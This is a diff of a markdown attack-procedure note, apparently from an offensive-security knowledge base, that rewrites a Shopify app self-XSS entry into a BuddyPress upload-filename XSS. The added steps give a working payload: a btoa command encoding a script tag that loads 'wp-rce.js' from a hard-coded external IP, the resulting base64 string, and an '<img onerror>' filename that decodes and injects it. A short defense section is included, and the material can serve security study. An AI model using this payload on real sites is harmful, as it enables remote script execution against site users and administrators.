@@ -1,15 +1,15 @@
 ---
-id: proc-uuid-3
+id: proc-003
 tags:
   - xss
   - file-upload
-  - javascript-execution
+  - payload
 type: procedure
-tools:
-  - '[[tools/Firefox]]'
+tools: []
 tactics:
   - '[[Execution]]'
-commands: []
+commands:
+  - '[[commands/btoa-payload-encode]]'
 verified: false
 platforms:
   - Web
@@ -17,61 +17,69 @@ submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:15:31.849Z'
+  - '[[Remote File Copy]]'
+updated_at: '2025-12-14T17:23:32.443Z'
 sub_techniques: []
 validated: true
 mitre_tactics:
   - '[[Execution]]'
 mitre_techniques:
   - '[[JavaScript]]'
+  - '[[Remote File Copy]]'
 ---
-# Upload-Malicious-Filename-for-XSS
+# Upload Malicious Filename for XSS
 
 ## Summary
 
-This procedure exploits the reflected XSS vulnerability by uploading a file with an unsanitized malicious filename, causing JavaScript to execute in the attacker's browser session.
+This procedure crafts and uploads an oversized file with a filename containing a base64-encoded XSS payload, triggering reflection in the BuddyPress upload error message to execute arbitrary JavaScript.
 
 ## Description
 
-The Digital Downloads App fails to sanitize the 'attachment[filepath]' parameter in the POST request to https://delivery.shopifyapps.com/attachments. By naming a file with an XSS payload like '<svg onload=alert(1)>', the response JSON reflects it unsanitized, triggering execution. This is a self-XSS limited to the uploader's session, potentially enabling session hijacking if combined with social engineering.
+The vulnerability stems from filenames being output in error messages without escaping (e.g., no esc_html() or .html() processing). By exceeding the upload size limit, the error page reflects the filename, executing an <img> tag's onerror handler that decodes and injects a script loading external JS. This requires social engineering for victim upload but demonstrates the chain.
 
 ## Requirements
 
-1. Configured product with digital attachment option
-2. Web browser to handle the upload and execution
-3. Test file ready for upload (any small file)
+1. Oversized file (e.g., >2MB PNG with padding)
+2. Encoded payload from [[commands/btoa-payload-encode]]
+3. Access to upload interface
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Implement server-side sanitization of filenames to strip HTML/JS tags
-- Use Content Security Policy (CSP) to block inline scripts
-- Monitor upload endpoints for suspicious payloads in logs
+- Escape filenames in error outputs using WordPress esc_html()
+- Limit filename characters to alphanumerics
+- Log and monitor upload attempts with suspicious filenames
 
 ## Objectives
 
-1. Trigger arbitrary JavaScript execution
-2. Demonstrate reflection in response
-3. Assess impact on session
+1. Trigger size limit error
+2. Reflect malicious filename
+3. Initiate XSS execution
 
 ## Instructions
 
-### Step 1: Prepare Malicious Filename
+### Step 1: Encode Payload
 
-**Context**: Create or rename a test file with the XSS payload as the filename.
+**Context**: Use browser console to base64-encode the injection string for obfuscation.
 
-No command required; in the file dialog, set filename to '<svg onload=alert(1)>' (any extension).
+**Command** ([[commands/btoa-payload-encode]]):
+```javascript
+btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
+```
 
-> Ensure the file is small, e.g., 144 bytes.
+> Expected output: Base64 string like UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=. Replace in filename.
 
-### Step 2: Perform Upload
+### Step 2: Prepare and Upload File
 
-**Context**: Submit the file via the app's upload interface, sending POST to the endpoint.
+**Context**: Rename oversized file to include XSS payload and submit.
 
-No command required; click upload and submit.
+**Command** (File Upload):
 
-> The request includes parameters like attachment[filepath]=<svg+onload=alert(1)>, attachment[filesize]=144, etc. Response reflects the filename, executing the onload alert.
+Filename: POC<img src=x onerror='document.write(atob("[BASE64_HERE]"))'>
+Select file and upload
+
+> Expected output: Error message like "File too large: [full filename]", triggering XSS.
 
 ## MITRE ATT&CK Mapping
 
@@ -82,18 +90,20 @@ No command required; click upload and submit.
 ### Techniques
 
 - [[JavaScript]]
+- [[Remote File Copy]]
 
 ### Sub-Techniques
 
 
 ## Commands Used
 
+- [[commands/btoa-payload-encode]]
 
 ## Tools Used
 
-- [[tools/Firefox]]
 
 ## Tags
 
-- [[xss]]
-- [[file-upload]]
+- xss
+- file-upload
+- payload
